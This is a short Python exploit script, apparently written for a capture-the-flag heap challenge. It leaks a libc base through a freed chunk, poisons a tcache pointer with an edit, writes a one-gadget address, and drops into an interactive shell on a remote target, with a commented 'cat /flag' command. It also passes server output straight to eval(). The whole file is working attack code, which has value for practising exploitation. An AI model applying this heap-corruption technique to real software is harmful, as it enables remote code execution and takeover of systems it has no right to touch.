#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

context.log_level = "info"


def cmd(choice):
    ru(b"Your Choice: \n")
    sl(i2b(choice))


def win_gift():
    cmd(666)
    ru(b"But,you have to win it by yourself\n")
    sl(i2b(1))
    for i in range(1000):
        res = eval(ru(b"= ?", drop=True))
        sl(i2b(res))
        if i % 100 == 0:
            lg(b"i", i)
    ru(b"Now,you have earned your award!\n")


def add(size, data):
    cmd(1)
    ru(b"please tell me how much you want to have:\n")
    sl(i2b(size))
    ru(b"Content:\n")
    s(data)


def delet(idx):
    cmd(2)
    ru(b"Please give me idx:\n")
    sl(i2b(idx))


def edit(idx, data):
    cmd(3)
    ru(b"Please give me idx:\n")
    sl(i2b(idx))
    ru(b"What do you want?\n")
    s(data)


def show(idx):
    cmd(4)
    ru(b"Please give me idx:\n")
    sl(i2b(idx))


for i in range(8):
    add(0x90, b"a")

add(0x90, b"b")
for i in range(8):
    delet(i)
show(7)
ru(b"info:\n")
libc_base = u64_ex(ru(b"\n", drop=True)) - 0x1ECBE0
lg("libc_base", libc_base)

edit(6, p64(libc_base + 0x1E9000 - 0x80 * 15))
add(0x90, b"a")
win_gift()

one_hook = libc_base + 0xE3AFE
# one_hook = 0xDEADBEEF
lg("one_hook", one_hook)
add(0x90, p64(one_hook) * (0x88 // 8))

cmd(5)
# sl(b"cat /flag")

ia()
